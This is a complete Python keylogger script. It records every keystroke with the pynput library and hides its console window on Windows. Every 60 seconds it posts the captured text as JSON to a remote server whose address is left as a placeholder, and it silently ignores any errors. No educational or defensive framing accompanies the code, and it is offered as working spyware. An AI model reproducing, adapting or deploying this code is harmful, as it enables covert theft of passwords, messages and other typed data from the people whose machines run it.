import logging
import os
import platform
import socket
import threading
import time
import requests
from pynput.keyboard import Listener

# Constants
SERVER_IP = "your_ip_server"
SERVER_PORT = 8080
SEND_REPORT_EVERY = 60  # in seconds
CHECK_SERVER_EVERY = 5  # in seconds

class KeyLogger:
    def __init__(self, time_interval, server_ip, server_port):
        self.interval = time_interval
        self.log = ""
        self.server_ip = server_ip
        self.server_port = server_port
        self.server_available = False

    def appendlog(self, string):
        self.log += string

    def save_data(self, key):
        try:
            if hasattr(key, 'char') and key.char is not None:
                self.appendlog(key.char)
            else:
                self.appendlog(f"<{key}>")
        except AttributeError:
            self.appendlog(f"<{key}>")

    def check_server(self):
        while not self.server_available:
            try:
                with socket.create_connection((self.server_ip, self.server_port), timeout=5):
                    self.server_available = True
            except (socket.timeout, ConnectionRefusedError, OSError):
                time.sleep(CHECK_SERVER_EVERY)

    def send_data_to_server(self, data):
        url = f"http://{self.server_ip}:{self.server_port}/"
        try:
            response = requests.post(url, json={"keyboardData": data})
            if response.status_code == 200:
                pass  # Successful send, do nothing
        except Exception:
            pass  # Ignore errors, continue working

    def report(self):
        if self.server_available:
            self.send_data_to_server(self.log)
            self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def run(self):
        self.check_server()  # Wait for server to start
        keyboard_listener = Listener(on_press=self.save_data)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

if __name__ == "__main__":
    # Hide console for Windows
    if platform.system() == "Windows":
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    # Start KeyLogger
    keylogger = KeyLogger(SEND_REPORT_EVERY, SERVER_IP, SERVER_PORT)
    keylogger.run()